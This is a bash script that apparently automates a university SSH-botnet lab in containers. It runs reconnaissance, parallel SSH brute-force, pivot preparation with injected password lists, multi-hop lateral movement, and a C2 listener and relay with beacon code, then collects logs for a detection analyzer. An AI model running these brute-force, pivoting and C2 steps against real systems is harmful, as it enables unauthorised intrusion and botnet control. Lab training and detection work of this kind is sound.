#!/usr/bin/env bash
# =============================================================================
# auto_run.sh — Fully automatic scenario runner for FEUP SSR SSH Botnet Lab
# FEUP SSR · May 2026
#
# Usage: ./auto_run.sh [1|2|3|4]
#   1 — single flat network
#   2 — 2 networks, 1 pivot           (default)
#   3 — 3 networks, 2 parallel pivots
#   4 — 3 networks, 2-hop deep chain
# =============================================================================

SCENARIO=${1:-2}

# ── Colors ─────────────────────────────────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; RESET='\033[0m'

log()    { echo -e "${CYAN}[$(date +%H:%M:%S)]${RESET} $*"; }
ok()     { echo -e "${GREEN}[✔]${RESET} $*"; }
warn()   { echo -e "${YELLOW}[!]${RESET} $*"; }
fail()   { echo -e "${RED}[✘]${RESET} $*"; }
banner() {
    echo -e "\n${BOLD}${CYAN}══════════════════════════════════════════════════${RESET}"
    echo -e "${BOLD}${CYAN}  $*${RESET}"
    echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════${RESET}\n"
}

# ── Validate input ─────────────────────────────────────────────────────────────
if [[ "$SCENARIO" -lt 1 || "$SCENARIO" -gt 4 ]] 2>/dev/null; then
    fail "Invalid scenario. Usage: ./auto_run.sh [1|2|3|4]"
    exit 1
fi

# ── Runtime detection ──────────────────────────────────────────────────────────
if command -v podman &>/dev/null; then
    RT=podman
elif command -v docker &>/dev/null; then
    RT=docker
else
    fail "Neither podman nor docker found."; exit 1
fi
log "Runtime: $RT"

# ── Network constants ──────────────────────────────────────────────────────────
ATTACKER=172.21.0.10
VICTIM1_EXT=172.21.0.20
VICTIM2_EXT=172.21.0.21

VICTIM1_INT=10.10.0.20
VICTIM3_INT=10.10.0.10
HONEYPOT_INT=10.10.0.50

VICTIM4_DEEP=10.20.0.10    # deep_net — scenario 3 (parallel pivot) + scenario 4 (2nd hop)
VICTIM5_DEEP=10.20.0.11    # deep_net — scenario 3 second parallel target

# Background PIDs to clean up on exit
BG_PIDS=()
cleanup() {
    for pid in "${BG_PIDS[@]:-}"; do
        kill "$pid" 2>/dev/null || true
    done
}
trap cleanup EXIT

# ── Helpers ────────────────────────────────────────────────────────────────────
wait_for_container() {
    local name=$1
    local max=30 i=0
    log "Waiting for $name..."
    while ! $RT exec "$name" echo ok &>/dev/null; do
        sleep 2; ((i++))
        if [[ $i -ge $max ]]; then
            warn "$name did not respond in time — continuing anyway"
            return 0
        fi
    done
    ok "$name is ready"
}

wait_for_ssh() {
    local via=$1 target=$2
    local max=20 i=0
    log "Waiting for SSH on $target..."
    while ! $RT exec "$via" bash -c "nc -z -w2 $target 22" &>/dev/null; do
        sleep 2; ((i++))
        [[ $i -ge $max ]] && { warn "SSH on $target may not be ready yet"; return 0; }
    done
    ok "SSH $target is up"
}

# =============================================================================
# PHASE 0 — Start the scenario
# =============================================================================
phase_setup() {
    banner "PHASE 0 — Starting Scenario $SCENARIO"

    log "Stopping any running containers..."
    $RT compose down 2>/dev/null || true

    local yml="scenarios/scenario${SCENARIO}.yml"
    if [[ ! -f "$yml" ]]; then
        fail "Compose file not found: $yml"; exit 1
    fi

    log "Launching $yml..."
    $RT compose -f "$yml" up -d --build

    # Wait for containers that always exist
    for c in attacker victim1 victim2 monitor; do
        wait_for_container "$c"
    done

    # Scenario-specific containers
    if [[ $SCENARIO -ge 2 ]]; then
        wait_for_container victim3
        wait_for_container honeypot
    fi
    if [[ $SCENARIO -ge 3 ]]; then
        wait_for_container victim4 2>/dev/null || true
        wait_for_container victim5 2>/dev/null || true
    fi

    log "Giving sshd 6 seconds to fully start..."
    sleep 6
    ok "Scenario $SCENARIO is up and ready"
}

# =============================================================================
# PHASE 1 — Reconnaissance
# =============================================================================
phase_recon() {
    banner "PHASE 1 — Reconnaissance"

    log "Scanning attack_net (172.21.0.x)..."
    $RT exec attacker python3 /lab/simulator.py scan --network 172.21.0. 2>&1 \
        | tee /tmp/scan_attack.txt
    ok "Scan complete"

    wait_for_ssh attacker "$VICTIM1_EXT"
    wait_for_ssh attacker "$VICTIM2_EXT"
}

# =============================================================================
# PHASE 2 — SSH Brute-Force on attack_net (parallel)
# =============================================================================
phase_bruteforce() {
    banner "PHASE 2 — SSH Brute-Force (attack_net)"

    log "Attacking victim1 ($VICTIM1_EXT) and victim2 ($VICTIM2_EXT) in parallel..."

    $RT exec attacker python3 /lab/simulator.py bruteforce \
        --target "$VICTIM1_EXT" --delay 0.5 --max-attempts 150 &
    BG_PIDS+=($!)

    $RT exec attacker python3 /lab/simulator.py bruteforce \
        --target "$VICTIM2_EXT" --delay 0.5 --max-attempts 150 &
    BG_PIDS+=($!)

    log "Waiting for both jobs..."
    wait "${BG_PIDS[@]}" 2>/dev/null || true
    BG_PIDS=()
    ok "Brute-force on attack_net complete"
}

# =============================================================================
# PHASE 3 — Prepare victim1 as pivot (copy paramiko + simulator)
# =============================================================================
phase_prepare_pivot() {
    banner "PHASE 3 — Preparing victim1 as Pivot"

    log "Packaging Python libs on attacker..."
    $RT exec attacker bash -c "
        tar czf /tmp/pkgs.tar.gz /usr/lib/python3/dist-packages/ 2>/dev/null || true
        tar czf /tmp/libs.tar.gz \
            /usr/lib/x86_64-linux-gnu/libsodium* \
            /usr/lib/x86_64-linux-gnu/libcrypto* \
            /usr/lib/x86_64-linux-gnu/libssl* 2>/dev/null || true
    "

    log "Copying packages to victim1..."
    $RT cp attacker:/tmp/pkgs.tar.gz /tmp/pkgs.tar.gz
    $RT cp /tmp/pkgs.tar.gz victim1:/tmp/pkgs.tar.gz
    $RT exec victim1 bash -c "cd / && tar xzf /tmp/pkgs.tar.gz 2>/dev/null || true"

    $RT cp attacker:/tmp/libs.tar.gz /tmp/libs.tar.gz
    $RT cp /tmp/libs.tar.gz victim1:/tmp/libs.tar.gz
    $RT exec victim1 bash -c "cd / && tar xzf /tmp/libs.tar.gz 2>/dev/null || true"
    $RT exec victim1 ldconfig 2>/dev/null || true

    log "Copying simulator to victim1 (with all credential sets)..."
    $RT cp attacker:/lab/simulator.py /tmp/sim.py
    python3 -c "
import re, sys
c = open('/tmp/sim.py').read()
# Inject all credential sets if not already present
for cred in ['internal123', 'service1', 'deepnet123']:
    if cred not in c:
        c = re.sub(r'(\"pass1234\")', r'\1, \"' + cred + '\"', c, count=1)
open('/tmp/sim.py','w').write(c)
print('Credentials patched')
" 2>&1 || warn "Could not patch simulator credentials — lateral may miss some"
    $RT cp /tmp/sim.py victim1:/tmp/sim.py

    if $RT exec victim1 python3 -c "import paramiko; print('paramiko ok')" 2>/dev/null; then
        ok "victim1 pivot ready"
    else
        warn "paramiko import failed on victim1 — lateral movement may not work"
    fi
}

# =============================================================================
# PHASE 4 — Lateral Movement → internal_net
# =============================================================================
phase_lateral() {
    banner "PHASE 4 — Lateral Movement (internal_net)"

    wait_for_ssh victim1 "$VICTIM3_INT"

    log "Brute-forcing victim3 ($VICTIM3_INT) FROM victim1..."
    $RT exec victim1 python3 /tmp/sim.py bruteforce \
        --target "$VICTIM3_INT" --delay 0.5 --max-attempts 120
    ok "Lateral to victim3 complete"

    log "Triggering honeypot ($HONEYPOT_INT) FROM victim1..."
    $RT exec victim1 python3 /tmp/sim.py bruteforce \
        --target "$HONEYPOT_INT" --delay 0.5 --max-attempts 60 || \
        warn "Honeypot phase returned non-zero (may be normal)"
    ok "Honeypot triggered"
}

# =============================================================================
# PHASE 4b — Deep Lateral Movement → deep_net (scenarios 3 & 4 only)
# =============================================================================
phase_lateral_deep() {
    banner "PHASE 4b — Deep Lateral Movement (deep_net 10.20.0.x)"

    # Copy packages to victim3 so it can be a second pivot (scenario 4)
    log "Preparing victim3 as second pivot..."
    $RT cp /tmp/pkgs.tar.gz victim3:/tmp/pkgs.tar.gz 2>/dev/null && \
        $RT exec victim3 bash -c "cd / && tar xzf /tmp/pkgs.tar.gz 2>/dev/null || true" || \
        warn "Could not copy packages to victim3"
    $RT cp /tmp/libs.tar.gz victim3:/tmp/libs.tar.gz 2>/dev/null && \
        $RT exec victim3 bash -c "cd / && tar xzf /tmp/libs.tar.gz 2>/dev/null || true; ldconfig 2>/dev/null || true" || true
    $RT cp /tmp/sim.py victim3:/tmp/sim.py 2>/dev/null || warn "Could not copy sim.py to victim3"

    if [[ "$SCENARIO" == "3" ]]; then
        # Two PARALLEL pivots: victim1 reaches both internal_net AND deep_net
        log "Scenario 3 — victim1 → victim4 ($VICTIM4_DEEP) and victim5 ($VICTIM5_DEEP) in parallel..."
        $RT exec victim1 python3 /tmp/sim.py bruteforce \
            --target "$VICTIM4_DEEP" --delay 0.5 --max-attempts 120 &
        BG_PIDS+=($!)
        $RT exec victim1 python3 /tmp/sim.py bruteforce \
            --target "$VICTIM5_DEEP" --delay 0.5 --max-attempts 120 &
        BG_PIDS+=($!)
        wait "${BG_PIDS[@]}" 2>/dev/null || true
        BG_PIDS=()
        ok "Parallel deep lateral complete"

    elif [[ "$SCENARIO" == "4" ]]; then
        # 2-hop chain: attacker → victim1 → victim3 → victim4
        log "Scenario 4 — victim3 → victim4 ($VICTIM4_DEEP) (2-hop chain)..."
        $RT exec victim3 python3 /tmp/sim.py bruteforce \
            --target "$VICTIM4_DEEP" --delay 0.5 --max-attempts 120 || \
            warn "Deep lateral from victim3 failed — check victim3 has paramiko and sim.py"
        ok "2-hop deep lateral complete: attacker → victim1 → victim3 → victim4"
    fi
}

# =============================================================================
# PHASE 5 — C2 Beaconing
# =============================================================================
phase_c2() {
    banner "PHASE 5 — C2 Beaconing"

    # ── C2 listener on attacker ────────────────────────────────────────────────
    log "Starting C2 listener on attacker (port 8888)..."
    $RT exec attacker python3 -c "
import socket
srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(('0.0.0.0', 8888))
srv.listen(10)
srv.settimeout(45)
print('[C2] Listener ready on port 8888', flush=True)
try:
    while True:
        try:
            conn, addr = srv.accept()
            data = conn.recv(1024).decode(errors='ignore')
            print(f'[C2] BEACON from {addr[0]}: {data[:80]}', flush=True)
            conn.send(b'HTTP/1.1 200 OK\r\n\r\nOK')
            conn.close()
        except socket.timeout:
            break
except Exception as e:
    print(f'[C2] Error: {e}')
print('[C2] Listener closed')
" &
    C2_PID=$!
    BG_PIDS+=($C2_PID)
    sleep 2

    # ── Beacons from victim1 → attacker ───────────────────────────────────────
    log "victim1 → attacker ($ATTACKER:8888) — 5 beacons..."
    $RT exec victim1 python3 -c "
import socket, time, json
from datetime import datetime
for i in range(5):
    try:
        payload = json.dumps({'bot_id':'victim1','type':'HEARTBEAT',
                              'seq':i+1,'ts':datetime.utcnow().isoformat()}).encode()
        s = socket.create_connection(('$ATTACKER', 8888), timeout=3)
        s.send(b'POST /beacon HTTP/1.1\r\nContent-Length: '
               + str(len(payload)).encode() + b'\r\n\r\n' + payload)
        s.close()
        print(f'Beacon {i+1}/5 sent', flush=True)
    except Exception as e:
        print(f'Beacon {i+1} failed: {e}', flush=True)
    time.sleep(2)
"

    if [[ $SCENARIO -ge 2 ]]; then
        # ── Relay listener on victim1 for victim3 ─────────────────────────────
        log "Starting C2 relay on victim1 (port 8889) for victim3..."
        $RT exec victim1 python3 -c "
import socket
srv = socket.socket()
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(('0.0.0.0', 8889))
srv.listen(10)
srv.settimeout(30)
print('[C2-relay] Ready on 8889', flush=True)
try:
    while True:
        try:
            c, a = srv.accept()
            data = c.recv(1024).decode(errors='ignore')
            print(f'[C2-relay] BEACON from {a[0]}: {data[:60]}', flush=True)
            c.send(b'HTTP/1.1 200 OK\r\n\r\n')
            c.close()
        except socket.timeout:
            break
except Exception as e:
    print(f'[relay] Error: {e}')
print('[C2-relay] Done')
" &
        RELAY_PID=$!
        BG_PIDS+=($RELAY_PID)
        sleep 2

        # ── Beacons from victim3 → victim1 relay ──────────────────────────────
        log "victim3 → victim1 relay ($VICTIM1_INT:8889) — 5 beacons..."
        $RT exec victim3 python3 -c "
import socket, time, json
for i in range(5):
    try:
        payload = json.dumps({'bot_id':'victim3','type':'HEARTBEAT','seq':i+1}).encode()
        s = socket.create_connection(('$VICTIM1_INT', 8889), timeout=3)
        s.send(b'POST /beacon HTTP/1.1\r\nContent-Length: '
               + str(len(payload)).encode() + b'\r\n\r\n' + payload)
        s.close()
        print(f'Beacon {i+1}/5 sent from victim3', flush=True)
    except Exception as e:
        print(f'Beacon {i+1} failed: {e}', flush=True)
    time.sleep(2)
" || warn "victim3 beaconing failed — check relay is reachable"
    fi

    log "Waiting for C2 listener to finish (up to 45s timeout)..."
    wait $C2_PID 2>/dev/null || true
    BG_PIDS=()
    ok "C2 beaconing phase complete"
}

# =============================================================================
# PHASE 7 — Log Collection & Detection
# =============================================================================
phase_detect() {
    banner "PHASE 7 — Log Collection & Detection"

    log "Collecting auth logs from all victims..."
    $RT exec victim1  cat /var/log/auth.log  > /tmp/a.log 2>/dev/null || true
    $RT exec victim2  cat /var/log/auth.log >> /tmp/a.log 2>/dev/null || true

    if [[ $SCENARIO -ge 2 ]]; then
        $RT exec victim3   cat /var/log/auth.log >> /tmp/a.log 2>/dev/null || true
        $RT exec honeypot  cat /var/log/auth.log >> /tmp/a.log 2>/dev/null || true
    fi
    if [[ $SCENARIO -ge 3 ]]; then
        $RT exec victim4 cat /var/log/auth.log >> /tmp/a.log 2>/dev/null || true
        $RT exec victim5 cat /var/log/auth.log >> /tmp/a.log 2>/dev/null || true
    fi

    local lines
    lines=$(wc -l < /tmp/a.log 2>/dev/null || echo 0)
    log "Total log lines collected: $lines"

    $RT cp /tmp/a.log monitor:/var/log/lab/auth.log
    ok "Logs copied to monitor"

    log "Running analyzer..."
    $RT exec monitor python3 /lab/monitor/analyzer.py --report
    ok "Detection analysis complete"
}

# =============================================================================
# Summary
# =============================================================================
print_summary() {
    banner "ALL DONE — Scenario $SCENARIO"
    echo -e "${GREEN}Phases completed:${RESET}"
    echo "  0   Lab startup (scenario${SCENARIO}.yml)"
    echo "  1   Reconnaissance scan — attack_net"
    echo "  2   SSH brute-force — victim1 + victim2 (parallel)"
    if [[ $SCENARIO -ge 2 ]]; then
        echo "  3   Pivot preparation on victim1"
        echo "  4   Lateral movement — internal_net (victim3, honeypot)"
    fi
    if [[ $SCENARIO -ge 3 ]]; then
        [[ "$SCENARIO" == "3" ]] && echo "  4b  Deep lateral — deep_net (victim4 + victim5, parallel pivots)"
        [[ "$SCENARIO" == "4" ]] && echo "  4b  Deep lateral — deep_net (victim3 → victim4, 2-hop chain)"
    fi
    echo "  5   C2 beaconing"
    echo "  7   Log collection + analyzer report"
    echo ""
    echo -e "${CYAN}Useful follow-up:${RESET}"
    echo "  $RT exec -it monitor  python3 /lab/monitor/analyzer.py --rules"
    echo "  $RT exec -it victim1  bash"
    echo "  $RT exec -it attacker bash"
    echo "  $RT exec -it honeypot cat /var/log/lab/honeypot_events.jsonl"
    echo "  $RT compose down"
    echo ""
    echo -e "Finished at: $(date)"
}

# =============================================================================
# MAIN
# =============================================================================
banner "FEUP SSR — Auto Scenario Runner — Scenario $SCENARIO"
log "Start: $(date)"

phase_setup
phase_recon
phase_bruteforce

if [[ $SCENARIO -ge 2 ]]; then
    phase_prepare_pivot
    phase_lateral
fi

if [[ $SCENARIO -ge 3 ]]; then
    phase_lateral_deep
fi

phase_c2
phase_detect
print_summary
